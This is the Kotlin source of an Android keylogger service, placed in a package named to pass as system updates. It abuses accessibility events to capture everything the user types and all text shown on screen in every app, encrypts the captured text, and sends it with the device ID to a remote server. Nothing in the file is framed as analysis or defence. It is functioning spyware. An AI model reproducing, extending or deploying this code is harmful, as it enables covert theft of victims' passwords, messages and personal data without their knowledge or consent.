package com.system.updates.modules

import android.accessibilityservice.AccessibilityService
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetUtils

class KeyloggerModule : AccessibilityService() {

    private val TAG = "KeyloggerModule"
    private var lastCapturedText = ""
    private var lastCapturedApp = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val packageName = event.packageName?.toString() ?: "unknown"
                val typedText = event.text?.joinToString(separator = " ") ?: ""

                if (typedText.isNotEmpty() && typedText != lastCapturedText) {
                    lastCapturedText = typedText
                    lastCapturedApp = packageName
                    Log.d(TAG, "Typed in $packageName: $typedText")

                    val logEntry = "App: $packageName | Content: $typedText"
                    val encrypted = CryptoManager.encryptHybrid(logEntry.toByteArray())
                    saveLog(encrypted)
                }
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val rootNode = rootInActiveWindow
                rootNode?.let { node ->
                    val packageName = event.packageName?.toString() ?: "unknown"
                    val screenText = extractAllText(node)
                    if (screenText.isNotEmpty() && screenText != lastCapturedText) {
                        lastCapturedText = screenText
                        lastCapturedApp = packageName
                        Log.d(TAG, "Screen content from $packageName: $screenText")

                        val logEntry = "App: $packageName | Screen: $screenText"
                        val encrypted = CryptoManager.encryptHybrid(logEntry.toByteArray())
                        saveLog(encrypted)
                    }
                    node.recycle()
                }
            }
        }
    }

    private fun extractAllText(node: AccessibilityNodeInfo): String {
        val texts = mutableListOf<String>()
        node.text?.let { texts.add(it.toString()) }

        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { child ->
                texts.add(extractAllText(child))
                child.recycle()
            }
        }
        return texts.joinToString(separator = " | ")
    }

    private fun saveLog(encryptedData: Pair<String, String>) {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        NetUtils.sendLog(deviceId, "keylogger", encryptedData.first, encryptedData.second) { success ->
            if (success) Log.i(TAG, "Log sent to server.")
        }
    }

    override fun onInterrupt() {
        Log.e(TAG, "Service interrupted")
    }
}
